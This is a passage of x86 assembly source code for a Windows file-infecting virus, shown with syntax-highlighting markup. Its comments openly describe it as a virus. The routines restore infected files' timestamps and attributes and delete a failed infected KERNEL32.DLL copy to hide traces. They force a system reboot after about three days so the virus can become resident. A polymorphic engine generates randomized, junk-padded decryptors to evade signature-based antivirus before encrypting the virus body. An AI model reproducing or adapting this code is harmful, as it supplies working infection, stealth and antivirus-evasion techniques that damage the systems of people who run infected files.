</span><span class="sc5">Close_Mapping</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">Map_Handle</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixCloseHandle</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

</span><span class="sc5">Restore_Stamp</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; Restore file's original</span><span class="sc0">
                        </span><span class="sc1">; time-stamps.</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">File_Handle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixSetFileTime</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

</span><span class="sc5">Close_File</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">               </span><span class="sc1">; And finally close the file.</span><span class="sc0">
</span><span class="sc5">File_Handle</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixCloseHandle</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc1">; Restore the file's original attributes.</span><span class="sc0">

</span><span class="sc5">Restore_Attr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Clear_Tracks_Sw</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Set_Attributes</span><span class="sc0">

        </span><span class="sc1">; Trash-copy must be deletable.</span><span class="sc0">

        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc2">00000001b</span><span class="sc0">

</span><span class="sc5">Set_Attributes</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixSetFileAttributesA</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

    </span><span class="sc1">; If something went wrong while in the process of infecting</span><span class="sc0">
    </span><span class="sc1">; an KERNEL32.DLL-copy, clean up our trash by deleting it.</span><span class="sc0">

</span><span class="sc5">Clear_Tracks</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">Clear_Tracks_Sw</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">               </span><span class="sc1">; Delete KRIZED.TT6 in the</span><span class="sc0">
</span><span class="sc5">Offset_Inf_K32</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">; system-directory.</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixDeleteFileA</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Free_Global_M</span><span class="sc0">

    </span><span class="sc1">; Here we initialize the virus to reboot the system if it has been</span><span class="sc0">
    </span><span class="sc1">; running for over approximately 3 days. Server-systems often run</span><span class="sc0">
    </span><span class="sc1">; for years constantly, and our virus can't become resident until</span><span class="sc0">
    </span><span class="sc1">; the next system-boot, hence this routine.</span><span class="sc0">

</span><span class="sc5">Reboot_Test</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixGetTickCount</span><span class="sc0">          </span><span class="sc1">; Retrieve tickcount since</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">                     </span><span class="sc1">; Windoze was started.</span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Less than approximately</span><span class="sc0">
        </span><span class="sc6">JNS</span><span class="sc0">     </span><span class="sc5">Free_Global_M</span><span class="sc0">           </span><span class="sc1">; 3 days?</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">@4</span><span class="sc0">                      </span><span class="sc1">; Load USER32.DLL as we need</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'USER32'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; one of it's functions.</span><span class="sc0">
</span><span class="sc5">@4</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixLoadLibraryA</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">@5</span><span class="sc0">                      </span><span class="sc1">; Retrieve API-address.</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'ExitWindowsEx'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@5</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixGetProcAddress</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc1">; Store the address for later use.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">ExitWindowsEx</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

</span><span class="sc5">Free_Global_M</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">               </span><span class="sc1">; Free our global allocated</span><span class="sc0">
</span><span class="sc5">Global_Handle</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">; memory.</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixGlobalFree</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

</span><span class="sc5">Rest_Inf_SEH</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Unhook our SEH.</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc0">

        </span><span class="sc6">POPAD</span><span class="sc0">                           </span><span class="sc1">; Restore reggies..</span><span class="sc0">

        </span><span class="sc6">RET</span><span class="sc0">                             </span><span class="sc1">; And we're done.</span><span class="sc0">


</span><span class="sc1">; Some humble poly-engine, it builds decryptors with random registers</span><span class="sc0">
</span><span class="sc1">; peppered with some simple junk. It won't keep-out the average AV,</span><span class="sc0">
</span><span class="sc1">; but it's effective enough against public-domain AV-scanners based on</span><span class="sc0">
</span><span class="sc1">; pure signature-scanning.</span><span class="sc0">

</span><span class="sc1">; So get me an official opcode list and I'll throw out the lame table-</span><span class="sc0">
</span><span class="sc1">; driven polymorphics :P</span><span class="sc0">

</span><span class="sc5">Poly_Engine</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSHAD</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">

</span><span class="sc5">Gen_Decryptor</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">+(</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">        </span><span class="sc1">; ECX on entry.</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">13</span><span class="sc0">                      </span><span class="sc1">; Pick a DWORD stacker.</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_Random</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">PUSH_Reg32</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)+</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9Ch</span><span class="sc0">                 </span><span class="sc1">; PUSHFD</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60h</span><span class="sc0">                 </span><span class="sc1">; PUSHAD</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Add_Garbage</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">                </span><span class="sc1">; CALL</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_Random</span><span class="sc0">

        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

</span><span class="sc5">Add_Random</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESP</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_Random</span><span class="sc0">

        </span><span class="sc6">STOSB</span><span class="sc0">

        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">Add_Random</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_Random</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">POP_Reg32</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)+</span><span class="sc8">EBX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_Free_Reg</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Add_Garbage</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">MOV_Reg32</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)+</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; MOV Cntr_Reg</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Add_Garbage</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Decrypt_Loop</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Add_Garbage</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_Random</span><span class="sc0">
        </span><span class="sc6">JP</span><span class="sc0">      </span><span class="sc5">Construct_XOR</span><span class="sc0">           </span><span class="sc1">; 1/2 chance of including DS:</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">                 </span><span class="sc1">; DS:</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">

</span><span class="sc5">Construct_XOR</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">XOR_Ptr_Reg32</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)+</span><span class="sc8">EBX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Patch_Delta</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">

</span><span class="sc5">Get_Random_Key</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_Random</span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Get_Random_Key</span><span class="sc0">

        </span><span class="sc6">STOSB</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Add_Garbage</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">DEC_Reg32</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)+</span><span class="sc8">EBX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Add_Garbage</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">DEC_Reg32</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)+</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc0">                 </span><span class="sc1">; JNZ</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">

        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">Decrypt_Loop</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">NOT</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">12345678h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
</span><span class="sc5">Patch_Delta</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">                </span><span class="sc1">; Calculate size decryptor.</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">+(</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">140</span><span class="sc0">                </span><span class="sc1">; Too large? Start over then.</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">Gen_Decryptor</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">120</span><span class="sc0">                 </span><span class="sc1">; Too small? Ditto.</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Gen_Decryptor</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSB</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">+(</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">        </span><span class="sc1">; EDX at entry.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">New_Virus_RVA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+(</span><span class="sc5">Virus_RVA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)-</span><span class="sc5">Virus_Size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Patch_Delta</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">NEG</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+(</span><span class="sc5">Patch_Decrypt</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)-</span><span class="sc5">Virus_Size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+(</span><span class="sc5">Busy_Switch</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)-</span><span class="sc5">Virus_Size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+(</span><span class="sc5">Unicode_Switch</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)-</span><span class="sc5">Virus_Size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">90ACh</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+(</span><span class="sc5">Delay_Timer</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)-</span><span class="sc5">Virus_Size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+(</span><span class="sc5">Init_Mode</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)-</span><span class="sc5">Virus_Size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">CALL_Setup_SEH</span><span class="sc4">-</span><span class="sc5">Init_Mode</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Infect_Mode</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">POP_New_EIP</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+(</span><span class="sc5">Init_Mode</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)-</span><span class="sc5">Virus_Size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">

</span><span class="sc5">POP_New_EIP</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+(</span><span class="sc5">Host_EIP</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)-</span><span class="sc5">Virus_Size</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">

</span><span class="sc5">Encrypt_Virus</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">

        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">Encrypt_Virus</span><span class="sc0">

        </span><span class="sc6">POPAD</span><span class="sc0">

        </span><span class="sc6">RET</span><span class="sc0">
